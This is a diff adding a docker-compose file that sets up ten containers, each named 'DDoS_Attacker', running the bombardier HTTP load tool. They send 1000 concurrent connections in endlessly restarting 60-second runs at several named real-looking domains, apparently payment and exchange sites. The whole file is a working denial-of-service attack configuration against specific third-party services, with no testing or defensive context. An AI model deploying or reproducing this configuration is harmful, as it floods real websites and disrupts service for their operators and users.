@@ -1,0 +1,52 @@
+version: "3.9"
+services:
+  s0:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_0"
+    command: [ "-c", "1000", "-d", "60s", "-l", "https://superchange.net/" ]
+    restart: "always"
+  s1:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_1"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://platov.co/"]
+    restart: "always"
+  s2:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_2"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://platov.co/"]
+    restart: "always"
+  s3:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_3"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://superchange.net/"]
+    restart: "always"
+  s4:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_4"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ww-pay.net/"]
+    restart: "always"
+  s5:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_5"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://delets.cash/"]
+    restart: "always"
+  s6:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_6"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://betatransfer.org/"]
+    restart: "always"
+  s7:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_7"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://delets.cash/"]
+    restart: "always"
+  s8:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_8"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ww-pay.net/"]
+    restart: "always"
+  s9:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_9"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://mine.exchange/"]
+    restart: "always"
